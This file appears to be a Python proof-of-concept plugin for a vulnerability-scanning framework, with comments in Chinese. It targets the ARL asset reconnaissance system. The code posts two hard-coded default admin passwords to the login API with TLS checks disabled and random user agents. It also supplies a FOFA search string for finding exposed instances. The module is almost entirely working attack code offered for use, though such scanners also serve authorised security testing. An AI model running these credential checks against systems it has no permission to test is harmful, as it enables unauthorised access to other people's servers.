# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            参考自iak师傅的项目，见致谢清单，笔者做了一点简单的防误报处理  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "斗象资产灯塔系统(ARL) 弱口令检测",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            斗象的ARL系统有默认的弱口令  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            "资产灯塔系统"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/api/user/login" # url自己按需调整
        data0 = "{\"username\":\"admin\",\"password\":\"arlpass\"}"
        data1 = "{\"username\":\"admin\",\"password\":\"admin123\"}"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json; charset=UTF-8",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url,data = data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "admin" in req0.text and \
                    "\"type\": \"login\"" in req0.text and \
                        "\"code\": 200," in req0.text and \
                            "\"username\": \"admin\", " in req0.text and \
                                req0.headers["Content-Type"] == "application/json":
                vuln = [True,"<html><title>admin/arlpass</title></html>"]
            else:
                req1 = requests.post(url,data = data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "admin" in req1.text and \
                    "\"type\": \"login\"" in req1.text and \
                        "\"code\": 200," in req1.text and \
                            "\"username\": \"admin\", " in req1.text and \
                                req1.headers["Content-Type"] == "application/json":
                    vuln = [True,"<html><title>admin/admin123</title></html>"]

        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()